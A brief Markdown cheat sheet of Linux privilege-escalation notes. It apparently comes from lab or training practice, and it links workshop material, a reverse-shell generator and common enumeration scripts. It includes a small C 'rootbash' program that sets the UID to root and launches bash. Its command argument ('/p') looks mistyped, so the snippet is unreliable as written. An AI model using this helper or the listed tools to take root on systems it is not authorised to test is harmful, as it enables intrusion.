# PrivEsc Linux

- [PrivEsc Linux](#privesc-linux)
  - [External Resource](#external-resource)
  - [reverse shell](#reverse-shell)
  - [Scripts](#scripts)

---

## External Resource

<https://github.com/sagishahar/lpeworkshop>

<https://github.com/tib3rius>

rootbash - /bin/bash with setuid set

```c
int main() {
    setuid(0);
    system("/bin/bash /p");
}
```

`gcc -o <name> <filename.c>`

## reverse shell

<https://github.com/mthbernardes/rsg>

## Scripts

- lse
- linenum
- linpeas
- linuxprivchecker
- beroot
- unix-privesc-check


- linux-exploit-sugester-2